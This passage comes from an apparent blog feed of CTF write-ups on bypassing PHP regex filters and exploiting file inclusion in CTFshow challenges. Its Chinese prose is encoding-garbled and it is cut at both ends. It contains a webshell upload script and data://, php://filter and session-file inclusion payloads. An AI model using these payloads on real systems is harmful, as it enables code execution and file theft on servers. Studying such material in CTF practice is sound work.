punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/^[a-z0-9]+$/'</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"OK\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"NG\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>è¿™é‡Œé‡åˆ°æ¢è¡ŒåŒ¹é…ä¸åˆ°</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;127.0.0.1&#x2F;?a&#x3D;123%0a<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221108222815571.png\" alt=\"image-20221108222815571\" /></p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;127.0.0.1&#x2F;?a&#x3D;%0a123<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221108222700947.png\" alt=\"image-20221108222700947\" /></p>\n<h4 id=\"å›æº¯æ¬¡æ•°é™åˆ¶\"><a class=\"anchor\" href=\"#å›æº¯æ¬¡æ•°é™åˆ¶\">#</a> å›æº¯æ¬¡æ•°é™åˆ¶</h4>\n<p>è¿™é‡Œæ‹œè¯» p ç‰›çš„æ–‡ç« <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubGVhdmVzb25ncy5jb20vUEVORVRSQVRJT04vdXNlLXBjcmUtYmFja3RyYWNrLWxpbWl0LXRvLWJ5cGFzcy1yZXN0cmljdC5odG1s\"> PHP åˆ©ç”¨ PCRE å›æº¯æ¬¡æ•°é™åˆ¶ç»•è¿‡æŸäº›å®‰å…¨é™åˆ¶ | ç¦»åˆ«æ­Œ (leavesongs.com)</span></p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'a'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>@<span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/&lt;\\?.*[(`;?>].*/is'</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"OK\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"NG\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>å¯¹äº demo ä¸­çš„æ­£åˆ™è¡¨è¾¾å¼</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">/</span><span class=\"token operator\">&lt;</span>\\<span class=\"token operator\">?</span><span class=\"token operator\">.</span><span class=\"token operator\">*</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span>`<span class=\"token punctuation\">;</span><span class=\"token operator\">?</span><span class=\"token operator\">></span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token operator\">*</span><span class=\"token operator\">/</span>is<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p>å‡è®¾ä¼ å…¥ &lt;?php phpinfo ();//aaaaa</p>\n<p>ä¼ å…¥æ­£åˆ™å.* åŒ¹é…å…¨éƒ¨çš„å­—ç¬¦ï¼Œä½†æ˜¯</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">[(&#96;;?&gt;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p>æ²¡æœ‰åŒ¹é…åˆ°ä¸œè¥¿ï¼Œäºæ˜¯ä¼šåå‡ºä¸€ä¸ª aï¼Œè¿˜æ˜¯åŒ¹é…ä¸ä¸Šï¼Œä¸€ç›´å›æº¯åˆ° phpinfo () åé¢çš„ï¼›ï¼Œåœæ­¢å›æº¯</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221108223613099.png\" alt=\"image-20221108223613099\" /></p>\n<p>PHP ä¸ºäº†é˜²æ­¢æ­£åˆ™è¡¨è¾¾å¼çš„æ‹’ç»æœåŠ¡æ”»å‡»ï¼ˆreDOSï¼‰ï¼Œç»™ pcre è®¾å®šäº†ä¸€ä¸ªå›æº¯æ¬¡æ•°ä¸Šé™ <code>pcre.backtrack_limit</code> ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡ <code>var_dump(ini_get('pcre.backtrack_limit'));</code>  çš„æ–¹å¼æŸ¥çœ‹å½“å‰ç¯å¢ƒä¸‹çš„ä¸Šé™</p>\n<p>å¯è§ï¼Œå›æº¯æ¬¡æ•°ä¸Šé™é»˜è®¤æ˜¯ 100 ä¸‡ã€‚å¦‚æœæˆ‘ä»¬å›æº¯è¶…è¿‡ 100 ä¸‡æ¬¡ preg_match å°±ä¼šè¿”å› false</p>\n<p>å¤§ä½¬çš„ payload</p>\n<p><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> requests\n<span class=\"token keyword\">from</span> io <span class=\"token keyword\">import</span> BytesIO\n\nfiles <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token string\">'file'</span><span class=\"token punctuation\">:</span> BytesIO<span class=\"token punctuation\">(</span><span class=\"token string\">b'aaa&lt;?php eval($_POST[txt]);//'</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'a'</span> <span class=\"token operator\">*</span> <span class=\"token number\">1000000</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#125;</span>\n\nres <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span><span class=\"token string\">'http://51.158.75.42:8088/index.php'</span><span class=\"token punctuation\">,</span> files<span class=\"token operator\">=</span>files<span class=\"token punctuation\">,</span> allow_redirects<span class=\"token operator\">=</span><span class=\"token boolean\">False</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>res<span class=\"token punctuation\">.</span>headers<span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<hr class=\"footnotes-sep\" />\n<section class=\"footnotes\">\n<ol class=\"footnotes-list\">\n<li id=\"fn1\" class=\"footnote-item\"><p>0-9 <a href=\"#fnref1\" class=\"footnote-backref\">â†©ï¸</a></p>\n</li>\n</ol>\n</section>\n",
            "tags": [
                "Web",
                "æ­£åˆ™è¡¨è¾¾å¼"
            ]
        },
        {
            "id": "https://blog.xcu.icu/2022/11/05/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/",
            "url": "https://blog.xcu.icu/2022/11/05/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/",
            "title": "CTFshow-webå…¥é—¨æ–‡ä»¶åŒ…å«",
            "date_published": "2022-11-05T04:00:00.000Z",
            "content_html": "<h2 id=\"web78\"><a class=\"anchor\" href=\"#web78\">#</a> web78</h2>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>dataï¼š</p>\n<p>ä» PHP5.2.0 èµ·ï¼Œæ•°æ®å°è£…æµå°±å¼€å§‹æœ‰æ•ˆï¼Œç”¨äºæ•°æ®æµçš„è¯»å–ã€‚<br />\nå¦‚æœä¼ å…¥çš„éƒ½æ˜¯ PHP ä»£ç ï¼Œå°±ä¼šæ‰§è¡Œä»»æ„ä»£ç </p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php system(&#39;tac flag.php&#39;);?&gt;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221104100708562.png\" alt=\"image-20221104100708562\" /></p>\n<p>php://filter æ˜¯å…ƒå°è£…å™¨ï¼Œè®¾è®¡ç”¨äºæ•°æ®æµæ‰“å¼€æ—¶ç­›é€‰è¿‡æ»¤åº”ç”¨ï¼Œå¯¹æœ¬åœ°ç£ç›˜æ–‡ä»¶è¿›è¡Œè¯»å†™</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221104101156551.png\" alt=\"image-20221104101156551\" /></p>\n<h2 id=\"web79\"><a class=\"anchor\" href=\"#web79\">#</a> web79</h2>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"php\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"???\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>payload:</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?&#x3D;&#96;cat flag.php&#96;?&gt;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p>è¿™é‡Œè¿˜æ˜¯ä½¿ç”¨ dataï¼Œå› ä¸ºè¿‡æ»¤äº† php æ‰€ä»¥è¿™é‡Œä½¿ç”¨çŸ­æ ‡ç­¾</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">&lt;?&#x3D; ?&gt;ç­‰åŒäº&lt;?php echo ?&gt;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221104140318246.png\" alt=\"image-20221104140318246\" /></p>\n<p>è¿™é‡Œçš„ç¬¬ä¸€è¡Œä»…èµ·å±è”½æŠ¥é”™çš„ä½œç”¨ï¼Œä¸ºäº†æ–¹ä¾¿å±•ç¤ºåŠ ä¸Šçš„ï¼Œæ²¡æœ‰ä¹Ÿèƒ½æ­£å¸¸è¾“å‡º</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221104140448180.png\" alt=\"image-20221104140448180\" /></p>\n<h2 id=\"web80\"><a class=\"anchor\" href=\"#web80\">#</a> web80</h2>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"php\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"???\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"data\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"???\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>å¯¹ç€å¹²äº†å±äºæ˜¯ï¼Œè¿™é‡Œå°†èƒ½ç”¨çš„ä¼ªåè®®ç»™éƒ½æ›¿æ¢äº†</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221104142025489.png\" alt=\"image-20221104142025489\" /></p>\n<p>è¿™é‡Œçœ‹åˆ°æ˜¯ nginx æœåŠ¡å™¨ï¼Œnginx æœ‰ä¸¤ä¸ªæ—¥å¿—æ–‡ä»¶ï¼Œä¸€ä¸ª access.log ç”¨æ¥è®°å½•æ¯æ¬¡æˆåŠŸçš„è¯·æ±‚ä¿¡æ¯ï¼ŒåŒ…æ‹¬ IP åœ°å€ï¼Œæ—¶é—´ï¼Œæµè§ˆå™¨ç­‰ä¿¡æ¯ï¼Œä¸€ä¸ª error.log è®°å½•å¼‚å¸¸ä¿¡æ¯</p>\n<p>ua å¤´ä¹Ÿä¼šåœ¨ access æ–‡ä»¶ä¸­</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221104143220895.png\" alt=\"image-20221104143220895\" /></p>\n<p>çœ‹åˆ° flag åº”è¯¥åœ¨ fl0g.php ä¸­</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221104141907175.png\" alt=\"image-20221104141907175\" /></p>\n<h2 id=\"web81\"><a class=\"anchor\" href=\"#web81\">#</a> web81</h2>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"php\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"???\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"data\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"???\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\":\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"???\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>å¤š ban äº†ä¸€ä¸ª:emmmm ä¼¼ä¹æ²¡å•¥ç”¨ï¼Ÿå› ä¸ºè¿™ä¸ªéš¾åº¦åº”è¯¥æ˜¯ä¸€å±‚ä¸€å±‚å¢åŠ çš„æ‰æ˜¯ï¼Œé‚£ä¹ˆè¿™ä¸ªï¼šåˆ°åº•å¢åŠ åœ¨å“ªå‘¢ï¼Ÿå†å›å»çœ‹çœ‹ 80 é¢˜</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"php\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"???\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"data\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"???\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre></p>\n<p>è¿™é‡Œæ›¿æ¢ï¼Œæˆ‘åå¤æ–Ÿé…Œåå‘ç°æˆ‘æ²¡æœ‰è€ƒè™‘åˆ°æœ€ç®€å•çš„åŠæ³•ï¼Œå¤§å°å†™ç»•è¿‡ï¼Œå›å»è¯•è¯•</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221104150442557.png\" alt=\"image-20221104150442557\" /></p>\n<p>è¯»å– flag</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221104150510196.png\" alt=\"image-20221104150510196\" /></p>\n<p>é‚£è¿™ä¸€é¢˜ç”¨ä¸Šä¸€é¢˜çš„æ–¹æ³•å°±è¡Œäº†</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221104150930071.png\" alt=\"image-20221104150930071\" /></p>\n<p>flag æ²¡æ¢åœ°æ–¹ï¼Œå†²</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221104151028431.png\" alt=\"image-20221104151028431\" /></p>\n<h2 id=\"web82\"><a class=\"anchor\" href=\"#web82\">#</a> web82</h2>\n<p>å› ä¸ºç¯å¢ƒé—®é¢˜ï¼Œè¿™å‡ ä¸ªåˆ°æ™šä¸Šæ‰è¡¥ä¸Š</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"php\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"???\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"data\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"???\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\":\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"???\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\".\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"???\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>è¿™é‡Œå‰é¢çš„åˆ©ç”¨æ–¹å¼éƒ½ç»™è¿‡æ»¤çš„å·®ä¸å¤šäº†ï¼Œå¯ä»¥ä½¿ç”¨ session.upload_progress æ–‡ä»¶æ¥æ–‡ä»¶åŒ…å«ï¼Œé¦–å…ˆæ¥èŠä¸€èŠä¸‹é¢è¿™å‡ ä¸ª php.ini ä¸­çš„é…ç½®</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">1. session.upload_progress.enabled &#x3D; on\n2. session.upload_progress.cleanup &#x3D; on\n3. session.upload_progress.prefix &#x3D; &quot;upload_progress_&quot;\n4. session.upload_progress.name &#x3D; &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>ç¬¬ä¸€ä¸ªï¼Œä¸º on è¡¨ç¤º upload_progress åŠŸèƒ½å¼€å¯ï¼Œå³ä¸Šä¼ æ–‡ä»¶æ—¶ä¼šå°†æ–‡ä»¶çš„è¯¦ç»†ä¿¡æ¯ï¼Œä¸Šä¼ è¿›åº¦å­˜å…¥ session ä¸­</p>\n<p>ç¬¬äºŒä¸ªï¼Œä¸º on è¡¨ç¤ºå†ä¼šè¯ç»“æŸåä¼šå°†æ–‡ä»¶ä¸­çš„å†…å®¹æ¸…ç©ºå¤„ç†</p>\n<p>ç¬¬ä¸‰ä¸ªï¼Œsession.upload_progress.prefixï¼Œè®¾ç½®ä¸Šä¼ æ–‡ä»¶å†…å®¹çš„å‰ç¼€</p>\n<p>ç¬¬å››ä¸ªï¼Œsession.upload_progress.name çš„å€¼å³ä¸º session ä¸­çš„é”®å€¼</p>\n<p>äº†è§£è¿‡è¿™å‡ ä¸ªé‡è¦çš„é…ç½®æ–‡ä»¶åï¼Œæˆ‘ä»¬è¯´ä¸€è¯´æ€ä¹ˆåˆ©ç”¨</p>\n<p>php.ini ä¸­ <code>session.use_strict_mode</code>  é€‰é¡¹é»˜è®¤æ˜¯ 0ï¼Œä¹Ÿå°±æ„å‘³ç€æˆ‘ä»¬å¯ä»¥è‡ªå®šä¹‰ SESSIONIDï¼Œç€æœ‰ä»€ä¹ˆç”¨å‘¢ï¼Ÿ</p>\n<p>åœ¨ Linux ä¸­ session çš„é»˜è®¤å‚¨å­˜ä½ç½®ä¸€èˆ¬æœ‰ä¸‹é¢å››ä¸ª</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">&#x2F;var&#x2F;lib&#x2F;php&#x2F;sess_PHPSESSID\n&#x2F;var&#x2F;lib&#x2F;php&#x2F;sessions&#x2F;sess_PHPSESSID\n&#x2F;tmp&#x2F;sess_PHPSESSID\n&#x2F;tmp&#x2F;sessions&#x2F;sess_PHPSESSID<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>ç”¨æˆ·åœ¨ cookie ä¸­è®¾ç½® sessionid=flagï¼Œé‚£ä¹ˆ PHP å°±ä¼šç”Ÿæˆä¸€ä¸ªæ–‡ä»¶ /tmp/sess_flag, 